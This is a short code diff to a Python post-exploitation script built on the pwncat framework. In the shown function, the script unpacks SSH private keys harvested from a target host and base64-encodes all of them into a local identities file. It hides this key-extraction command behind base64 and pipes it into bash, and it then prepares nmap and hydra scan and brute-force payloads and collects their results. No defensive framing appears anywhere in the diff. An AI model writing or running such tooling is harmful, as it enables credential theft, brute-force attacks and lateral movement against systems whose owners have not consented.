@@ -3,6 +3,7 @@ import base64
 import os
 import pwncat.manager
 from pwncat.channel import ChannelError
+import subprocess
 import argparse
 from pathlib import Path
 import time
@@ -67,9 +68,10 @@ def execute(session: pwncat.manager.Session, task):
 
             session.log(
                 "creating local /tmp/identities.txt with discovered keys...")
-            result = session.platform.run(
-                f'rm -rf /tmp/ssh_keys; mkdir /tmp/ssh_keys; tar -zxvf /tmp/ssh_keys.tar.gz -C "/tmp/ssh_keys"; cd /tmp/ssh_keys; truncate -s0 /tmp/identities.txt; for k in $(find /tmp/ssh_keys -type f); do cat $k | base64 -w0 >> /tmp/identities.txt; done',
-                cwd="/tmp", timeout=900)
+            payload = base64.b64encode(
+                f'rm -rf /tmp/ssh_keys; mkdir /tmp/ssh_keys; tar -zxvf /tmp/{args.target_ip}_ssh_keys.tar.gz -C "/tmp/ssh_keys"; cd /tmp/ssh_keys; truncate -s0 /tmp/identities.txt; for k in $(find /tmp/ssh_keys -type f); do cat $k | base64 -w0 >> /tmp/identities.txt; done'.encode('utf-8'))
+            result = subprocess.run(
+                ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_extractidentites | base64 -d | /bin/bash'], cwd="/tmp", capture_output=True, text=True)
             session.log(result)
 
             session.log("building nmap and hydra scan paylod...")
@@ -83,8 +85,8 @@ def execute(session: pwncat.manager.Session, task):
                 cwd="/tmp", timeout=900)
             session.log(result)
 
-            files = ["/tmp/scan.json", "/tmp/hydra-target.txt",
-                     "/tmp/hydra-targets.txt", "/tmp/hydra.txt", "/tmp/hydra-found.txt"]
+            files = ["/tmp/scan.json", "/tmp/hydra-targets.txt",
+                     "/tmp/hydra.txt", "/tmp/hydra-found.txt"]
             file_list = ", ".join(files)
             session.log(
                 f"copying scan results: {file_list}...")
